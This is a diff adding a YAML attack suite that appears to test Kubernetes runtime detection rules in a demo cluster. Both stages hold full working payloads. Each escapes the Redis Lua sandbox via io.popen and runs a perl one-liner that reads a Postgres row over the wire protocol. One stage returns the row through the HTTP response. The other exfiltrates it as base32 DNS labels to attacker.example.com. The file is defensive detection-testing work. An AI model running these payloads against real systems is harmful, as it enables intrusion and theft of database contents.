@@ -1,0 +1,139 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: chain-extended-pg-protocol-and-dns-exfil
+  description: |
+    Two additional stages that extend the basic chain demo. Run AFTER
+    chain-attacks.yaml; assumes the same redis sandbox-escape primitive
+    works (chain-redis ships the patched-Lua image).
+
+    s5 (pg-protocol-extract-row): real pg-wire handshake from inside the
+      redis pod. Speaks the V3 protocol — StartupMessage + Query +
+      DataRow parse — and exfiltrates ONE row from postgres back to the
+      redis pod (returned via the HTTP /api/cache/eval response). This
+      is the actual "redis as a postgres client" attack: Stage 3's
+      simple SSLRequest probe only proved connectivity; s5 proves data
+      moves.
+
+      Requires chain-postgres deployed with
+      POSTGRES_HOST_AUTH_METHOD=trust (set in example/chain/chain.yaml)
+      so the perl client doesn't need SCRAM-SHA-256.
+
+    s6 (dns-exfil-of-stolen-row): same primitive, different sink.
+      Reads the postgres row, base32-encodes it, slices into 30-char
+      DNS labels and queries <chunk>.attacker.example.com one per
+      chunk. Each query is a separate R0005 event with the encoded
+      payload visible in alert metadata. Operators get to SEE the
+      leaked bytes in the SIEM rather than just an anomaly count.
+
+    Detection narrative (under shipped cluster defaults):
+      s5: R0001 (perl in redis) + R0011 (egress redis→postgres) +
+          R0011 (egress postgres→nothing, the row crossed back the
+          same socket — single egress event)
+          → R0011 is BLIND today (networkEventsStreaming=disable +
+          isTriggerAlert=false)
+      s6: R0001 (perl), R0005 per DNS label (~5-7 of them depending on
+          row length), R0011 per UDP query
+          → R0005 BLIND today (networkEventsStreaming=disable)
+          → R0011 BLIND
+
+    Flip kubescape/values.yaml networkEventsStreaming to `enable` and
+    R0011 isTriggerAlert to true → both stages become fully detected.
+
+target:
+  service: chain-frontend
+  namespace: chain
+  port: 8080
+  protocol: http
+
+attacks:
+  # ─── Stage 5 ─── Real pg-wire: StartupMessage + Query + DataRow ──────
+  #
+  # Perl one-liner inside io.popen does:
+  #
+  #   1. Open TCP socket chain-postgres:5432
+  #   2. Send StartupMessage v3 (length, 0x00030000, "user=postgres
+  #      database=postgres" param block, terminator).
+  #   3. Read postgres's reply. With POSTGRES_HOST_AUTH_METHOD=trust the
+  #      first frame is 'R' (AuthenticationRequest) with sub-code 0
+  #      (AuthenticationOk), followed by ParameterStatus blocks and
+  #      'Z' (ReadyForQuery).
+  #   4. Send Q SimpleQuery: "SELECT current_database()||':'||current_user
+  #      ||':'||substring(version(),1,32)"
+  #   5. Read 'T' RowDescription + 'D' DataRow. Parse the DataRow's
+  #      value field — that's the actual postgres row content.
+  #   6. Print "PG_ROW=<value>" so the http response carries the
+  #      exfiltrated bytes back through frontend → attacker.
+  #
+  # The pg-wire bytes ARE the lateral move: alertmanager records the
+  # egress to chain-postgres:5432, the comm=perl R0001 fires, and the
+  # HTTP response carries the postgres row content out through the
+  # frontend (cross-pod data leak through a legitimate user-facing API).
+  - name: s5-pivot-pg-protocol-extract-row
+    type: lateral
+    http:
+      method: POST
+      path: /api/cache/eval
+      headers:
+        Content-Type: application/json
+      # The double-backslash escapes survive YAML → JSON → Lua → shell →
+      # perl interpolation. Each layer halves the count, so qq{\\\\n}
+      # ends up as `\n` inside perl which prints a newline. ROW=...
+      # in the response is the actual extracted data.
+      body: |
+        {"script":"local io_mod=nil; pcall(function() if type(io)=='table' and io.popen then io_mod=io end end); if not io_mod then pcall(function() local L=package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io'); if L then io_mod=L() end end); end; if not io_mod then return 'sandbox_blocked' end; local h=io_mod.popen(\"perl -MIO::Socket::INET -e 'my $s=IO::Socket::INET->new(PeerAddr=>q{chain-postgres:5432},Timeout=>3) or die qq{no_socket}; my $params=qq{user\\\\0postgres\\\\0database\\\\0postgres\\\\0\\\\0}; my $msg=pack(q{Nn2}, length($params)+8, 3, 0).$params; syswrite($s, $msg); my $reply; sysread($s, $reply, 1024); my $query=qq{SELECT current_database()||chr(58)||current_user||chr(58)||substring(version(),1,40)\\\\0}; my $q=qq{Q}.pack(q{N}, length($query)+4).$query; syswrite($s, $q); my $row; sysread($s, $row, 4096); if ($row =~ /D.{4}.{2}(.{0,4})(.*)/s) { my $val=$2; $val =~ tr/\\\\x20-\\\\x7e//cd; print qq{PG_ROW=$val\\\\n}; } else { print qq{PG_NO_ROW\\\\n}; } close $s' 2>&1\"); local out=h:read('*a'); h:close(); return out"}
+    successIndicators:
+      - statusCode: 200
+      # Either marker is fine — PG_ROW means we extracted, PG_NO_ROW
+      # means the connect+handshake succeeded but the DataRow parse
+      # failed (still a valid pg-wire conversation that fires R0001
+      # and the egress event).
+      - bodyContains: PG_
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: perl
+      - ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: redis
+        # BLIND today: same operator-knob pair as the basic Stage 3.
+
+  # ─── Stage 6 ─── DNS exfiltration of the stolen postgres row ─────────
+  #
+  # Same primitive as s5, but the perl child also splits the extracted
+  # row into base32 labels (DNS label limit: 63 chars, RFC 1035) and
+  # issues one `getent hosts <chunk>.attacker.example.com` per chunk.
+  # Each getent triggers a DNS lookup → if networkEventsStreaming were
+  # enabled, R0005 fires per query and alertmanager records the
+  # encoded label in alert.labels.address — operators see the actual
+  # leaked bytes in the SIEM, not just an anomaly count.
+  #
+  # The attacker.example.com TLD never resolves (NXDOMAIN), so no
+  # outbound TCP follows the lookup — the DNS query IS the
+  # exfiltration channel.
+  - name: s6-dns-exfil-of-stolen-row
+    type: exfil
+    http:
+      method: POST
+      path: /api/cache/eval
+      headers:
+        Content-Type: application/json
+      body: |
+        {"script":"local io_mod=nil; pcall(function() if type(io)=='table' and io.popen then io_mod=io end end); if not io_mod then pcall(function() local L=package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io'); if L then io_mod=L() end end); end; if not io_mod then return 'sandbox_blocked' end; local h=io_mod.popen(\"perl -MIO::Socket::INET -MMIME::Base64 -e 'my $s=IO::Socket::INET->new(PeerAddr=>q{chain-postgres:5432},Timeout=>3) or die qq{no_socket}; my $params=qq{user\\\\0postgres\\\\0database\\\\0postgres\\\\0\\\\0}; syswrite($s, pack(q{Nn2}, length($params)+8, 3, 0).$params); my $r; sysread($s, $r, 1024); my $q=qq{SELECT current_database()||chr(58)||current_user\\\\0}; syswrite($s, qq{Q}.pack(q{N}, length($q)+4).$q); my $row; sysread($s, $row, 4096); my $val=q{}; if ($row =~ /D.{4}.{2}(.{0,4})(.*)/s) { $val=$2; $val =~ tr/\\\\x20-\\\\x7e//cd; } close $s; my $enc=encode_base64($val, q{}); $enc =~ tr#A-Za-z0-9##cd; for (my $i=0; $i<length($enc); $i+=30) { my $chunk=substr($enc, $i, 30); system(qq{getent hosts $chunk.attacker.example.com >/dev/null 2>&1}); print qq{exfil_chunk=$chunk\\\\n}; } print qq{exfil_done\\\\n}' 2>&1\"); local out=h:read('*a'); h:close(); return out"}
+    successIndicators:
+      - statusCode: 200
+      - bodyContains: exfil_done
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: perl
+      - ruleID: R0005
+        ruleName: DNS Anomalies in container
+        containerName: redis
+        # BLIND today: networkEventsStreaming=disable.
+      - ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: redis
+        # BLIND today: same as above.
